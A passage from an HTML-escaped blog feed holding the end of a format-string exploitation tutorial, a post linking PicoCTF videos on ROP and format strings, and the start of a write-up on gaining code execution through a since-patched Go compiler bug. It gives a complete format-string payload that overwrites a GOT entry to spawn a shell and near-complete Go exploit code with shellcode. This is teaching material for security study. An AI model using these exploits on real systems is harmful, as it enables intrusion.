&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#AAAABBBB%00000x%17&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%18&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00xf7fcbff48048449&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our goal is to find the correct offsets (instead of 17 and 18) so that the we output &lt;code&gt;sh;#AAAABBBB&amp;lt;garbabe&amp;gt;0x41414141&amp;lt;garbage&amp;gt;0x42424242&lt;/code&gt;. 
This takes some work, but in our case the correct offsets are 99 and 100:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#AAAABBBB%00000x%99&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%100&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x4141414180484490x42424242
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is important to note that our payload is &lt;em&gt;very&lt;/em&gt; sensitive to a change in length: adding one byte 
to the end of the string will change the required offsets and perhaps mess up the alignment.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#AAAABBBB%00000x%99&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%100&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)A&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x2e00000080484490x6f2e612fA
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is because the arguments are passed onto the stack before the start of our program, and so changing the
length of the arguments will change their alignment and the initial stack location for the program itself. In
order to have our exploit work consistently, we need to ensure that the payload is at a consistent alignment 
(and at a consistent offset above us on the stack) by being careful to control the amount of stuff on the stack.
This is also why we are using &lt;code&gt;env -i&lt;/code&gt; as a wrapper for our program (it clears the environment, which is also 
passed onto the stack before the start of a program).&lt;/p&gt;
&lt;p&gt;Anyways, lets find the &lt;code&gt;strdup&lt;/code&gt; GOT entry:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;08048330 &amp;lt;strdup@plt&amp;gt;:&lt;/span&gt;
&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we know where to write. We want to the address of &lt;code&gt;system&lt;/code&gt; to the &lt;code&gt;strdup&lt;/code&gt; got entry, &lt;code&gt;0x804a004&lt;/code&gt;. 
For now, we plug in our address into the payload and make sure everything still works out:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="se"&gt;\x&lt;/span&gt;06&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08%00000x%99&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%100&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;00x804a00480484490x804a006
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The next step is to figure out where to write. First, since it is a 32 bit binary, we can disable libc randomization. 
We disable libc randomization via:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -s unlimited
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now the address of &lt;code&gt;system&lt;/code&gt; is at a deterministic location in memory. 
We can just open up the program in &lt;code&gt;gdb&lt;/code&gt; and print the address of &lt;code&gt;system&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b main&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8048417&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08048417 in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) p system&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x555c2250 &amp;lt;system&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, now we know that we need to write &lt;code&gt;0x555c2250&lt;/code&gt; (the address of system)
to the address &lt;code&gt;0x804a004&lt;/code&gt; (the got entry of &lt;code&gt;strdup&lt;/code&gt;). We are doing this in two parts. 
First, we write &lt;code&gt;0x2250&lt;/code&gt; to the two bytes at &lt;code&gt;0x804a004&lt;/code&gt; then we write &lt;code&gt;0x555c&lt;/code&gt; to
the two bytes at &lt;code&gt;0x804a006&lt;/code&gt;. We can figure out how many bytes to write in python:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x2250 - 12 &lt;span class="c"&gt;# We&amp;#39;ve already written 12 bytes (&amp;quot;sh;#AAAABBBB&amp;quot;).&lt;/span&gt;
&lt;span class="go"&gt;8772&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x555c - 0x2250 &lt;span class="c"&gt;# We&amp;#39;ve already written 0x2250 bytes.&lt;/span&gt;
&lt;span class="go"&gt;13068&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we plug these values into our payload, change the &lt;code&gt;%hp&lt;/code&gt; to &lt;code&gt;%hn&lt;/code&gt;. Note that when 
we change the &lt;code&gt;%00000x&lt;/code&gt; to &lt;code&gt;%08772&lt;/code&gt;, we leave the leading &lt;code&gt;0&lt;/code&gt; so that our string
stays the same length. Here is the final exploit:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="se"&gt;\x&lt;/span&gt;06&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08%08772x%99&lt;span class="nv"&gt;$hn&lt;/span&gt;%13068x%100&lt;span class="nv"&gt;$hn&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;..&amp;lt;garbage&amp;gt;..sh-4.2&lt;span class="nv"&gt;$ &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Woo hoo, we got our shell!&lt;/p&gt;
&lt;h1&gt;Debugging an exploit&lt;/h1&gt;
&lt;p&gt;Sometimes, things don't go as planned and we don't get a shell. If this
happens, &lt;code&gt;gdb&lt;/code&gt; is your friend. Unfortunately, &lt;code&gt;gdb&lt;/code&gt; isn't a very good friend.
It helpfully puts stuff in your environment, so any careful calculations you
were doing related to the stack may no longer be valid. In order to resolve
this, you need to make sure your environment looks like the environment used 
by &lt;code&gt;gdb&lt;/code&gt;. We
first see what the stack looks like under &lt;code&gt;gdb&lt;/code&gt; and then always run our exploit
with that environment:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i /usr/bin/printenv
&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q /usr/bin/printenv
&lt;span class="go"&gt;Reading symbols from /usr/bin/printenv...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) unset env&lt;/span&gt;
&lt;span class="go"&gt;Delete all environment variables? (y or n) y&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /usr/bin/printenv &lt;/span&gt;
&lt;span class="go"&gt;PWD=/home/ppp&lt;/span&gt;
&lt;span class="go"&gt;SHLVL=0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we know the environment used by &lt;code&gt;gdb&lt;/code&gt;, we can make sure to always 
execute our payload with the same environment so we can test our exploit in
&lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;SHLVL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0 ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;print &amp;quot;&lt;/span&gt;my_exploit_string&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span class="c"&gt;# Outside gdb.&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; gdb ./a.out &lt;span class="c"&gt;# Inside gdb.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) unset env&lt;/span&gt;
&lt;span class="go"&gt;Delete all environment variables? (y or n) y&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r &amp;quot;$(/usr/bin/python -c &amp;#39;print &amp;quot;my_exploit_string&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The most helpful thing to do in &lt;code&gt;gdb&lt;/code&gt; is to break just before the call to
&lt;code&gt;printf&lt;/code&gt; and make sure the argument and the stack stack is what you 
expect (if you expect to use &lt;code&gt;%10$hn&lt;/code&gt;, make sure the value you control is the 10th argument after the format
string).
If that works, then break right after the call to &lt;code&gt;printf&lt;/code&gt; and make sure the value you expect is at the target address.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;Breakpoint 1, 0x080484ae in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/2i $pc&lt;/span&gt;
&lt;span class="go"&gt;=&amp;gt; 0x80484ae &amp;lt;main+74&amp;gt;: call   0x8048360 &amp;lt;printf@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x80484b3 &amp;lt;main+79&amp;gt;: mov    $0x0,%eax&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb70: 0xffffdb98&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/s 0xffffdb98&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb98:  &amp;quot;AAAA%10$p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/11a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb70: 0xffffdb98  0xffffdddd  0x64    0xf7ec1289&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb80: 0xffffdbbf  0xffffdbbe  0x0 0xffffdca4&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb90: 0xffffdc44  0x0 0x41414141&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp + 40&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb98: 0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="footnote"&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li id="fn:1"&gt;
&lt;p&gt;You'll note the single quotes - &lt;code&gt;$&lt;/code&gt; is a special symbol on the shell and would otherwise need to be escaped.&amp;#160;&lt;a class="footnote-backref" href="#fnref:1" rev="footnote" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:2"&gt;
&lt;p&gt;You'll note that we use print the exploit string in a python subshell. 
This isn't strictly necessary in this case, but for more interesting exploits the ability to print escape characters
and use arbitrary bytes in our payload is very useful. We also print via &lt;code&gt;sys.stdout.write&lt;/code&gt; to prevent the newline
at the end we would get if we otherwise used &lt;code&gt;print&lt;/code&gt; and surround the subshell in double quotes in case the payload had
whitespace in it.&amp;#160;&lt;a class="footnote-backref" href="#fnref:2" rev="footnote" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</summary><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>PicoCTF Videos</title><link href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html" rel="alternate"></link><updated>2013-04-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-28:posts/2013/04/28/picoctf-videos.html</id><summary type="html">&lt;p&gt;For &lt;a href="picoctf.com"&gt;PicoCTF&lt;/a&gt; this year, I made some slides and recorded some
video tutorials. I'll probably turn these into better tutorials on this blog at
some later point.&lt;/p&gt;
&lt;h1&gt;Introduction to Return Oriented Programming (ROP)&lt;/h1&gt;
&lt;!-- &lt;video width="100%" controls&gt;
  &lt;source src="https://dl.dropboxusercontent.com/u/15197322/easy_rop.mp4"&gt;
&lt;/video&gt; --&gt;

&lt;iframe src="http://player.vimeo.com/video/65014453" width="500" height="375"
frameborder="0" webkitAllowFullScreen mozallowfullscreen
allowFullScreen&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href="https://dl.dropboxusercontent.com/u/15197322/easy_rop.pdf"&gt;slides&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Introduction to Format String Vulnerabities&lt;/h1&gt;
&lt;!-- &lt;video controls width="100%"&gt;
  &lt;source src="https://dl.dropboxusercontent.com/u/15197322/easy_format.mp4"&gt;
&lt;/video&gt; --&gt;

&lt;iframe src="http://player.vimeo.com/video/65014452" width="500" height="375"
frameborder="0" webkitAllowFullScreen mozallowfullscreen
allowFullScreen&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href="https://dl.dropboxusercontent.com/u/15197322/easy_format.pdf"&gt;slides&lt;/a&gt; &lt;a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html"&gt;tutorial&lt;/a&gt;&lt;/p&gt;</summary><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>Exploiting a Go Binary</title><link href="http://codearcana.com/posts/2013/04/23/exploiting-a-go-binary.html" rel="alternate"></link><updated>2013-04-23T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-23:posts/2013/04/23/exploiting-a-go-binary.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;Earlier this year, tylerni7 showed us a proof of concept for a 32 bit Go
exploit using &lt;a href="https://code.google.com/p/go/issues/detail?id=5336"&gt;this
issue&lt;/a&gt;. geohot and I had a wager over who could get the first remote code
execution on &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt;: he won, but
just barely ;-). Props also to ricky for helping to find the underlying
cause/writing the patch. Here is a summary of how we did it.&lt;/p&gt;
&lt;p&gt;Note: &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt; is properly sandboxed, so 
code execution there does not
actually let you do anything. Had this been a more serious bug that could
actually be used for anything malicious, we would have immediately reported it
privately. Neither specific vulnerability nor the technique used here work in the latest version of Go (the vulnerability was patched and Go 1.1 introduced non-executable heaps).&lt;/p&gt;
&lt;p&gt;This post is cross posted on the &lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1087"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;The Bug&lt;/h3&gt;

&lt;p&gt;Go has support for embedded structs. You can define an embedded struct as follows:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
It is valid to do both &lt;tt&gt;instance.bar&lt;/tt&gt; and &lt;tt&gt;instance.foo&lt;/tt&gt;.&lt;/p&gt;

&lt;p&gt;The problem comes when you try something slightly trickier:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
When you access &lt;tt&gt;instance.foo&lt;/tt&gt; (a member of an uninitialized struct), it incorrectly offsets from 0 rather than from the base of an &lt;tt&gt;Embedded&lt;/tt&gt; struct. Normally, when dereferencing a pointer inside a struct, the go compiler
emits guard code which will cause a segfault if the pointer is nil.
However, this code is not emitted when the pointer is the first element
of the struct, since it's assumed that this will cause a segfault
whenever it is used anyway.  This assumption is not always valid, as the
pointer can be to a large struct such that the offsets of members of the large
struct are valid addresses.
&lt;/p&gt;

&lt;h3&gt;The Vulnerability&lt;/h3&gt;

&lt;p&gt;We define an enormous struct and use it to offset memory:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x400100&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;address&lt;/span&gt; &lt;span class="kt"&gt;uint32&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
Now we can do &lt;tt&gt;instance.address = 0xdeadbeef&lt;/tt&gt; and we have written to &lt;tt&gt;0x400100&lt;/tt&gt;! This is the arbitrary write primitive we need.&lt;/p&gt;

&lt;h3&gt;The Exploit&lt;/h3&gt;

&lt;p&gt;Once you have an arbitrary write in go, it is &lt;em&gt;really easy&lt;/em&gt; to get arbitrary code execution. We put a function pointer in our data segment (we wanted to put it in the heap, but that didn't work on 64bit Go - apparently the size of a struct is limited to 32 bits. Luckily, the data segment is in the lower 32 bits) and change it to point to our shell code using the arbitrary write. Since Go has &lt;em&gt;no randomization&lt;/em&gt; at all, this is as simple as running the program twice. Full exploit below:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;// Address to write, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x50e2f0&lt;/span&gt;
&lt;span class="c1"&gt;// &amp;amp;shellcode, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xc200035160&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;payload&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Nested&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// This magic is necessary is because there is an explict null check if&lt;/span&gt;
  &lt;span class="c1"&gt;// if the offset is greater than 0x1000.&lt;/span&gt;
  &lt;span class="nx"&gt;Embedded&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="c1"&gt;// The issue is that a reference to the embeded struct pointer here&lt;/span&gt;
 &lt;span class="c1"&gt;// will be offset from null (rather than the true base of the struct).&lt;/span&gt;
 &lt;span class="c1"&gt;// We thus just make sizeof(the embedded struct) large enough to point&lt;/span&gt;
 &lt;span class="c1"&gt;// to the address we want to overwrite.&lt;/span&gt;
 &lt;span class="c1"&gt;//&lt;/span&gt;
 &lt;span class="c1"&gt;// See https://code.google.com/p/go/issues/detail?id=5336&lt;/span&gt;
 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Nested&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;unused&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;

&lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="nx"&gt;s&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;Struct&lt;/span&gt;&lt;span class="p"&gt;{}&lt;/span&gt;
 &lt;span class="nx"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;\x90\x90\x90\x90\x90\x90\x90\xeb\xfe&amp;quot;&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You should overwrite this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;With this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;***********************************************&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Overwriting &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; with &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

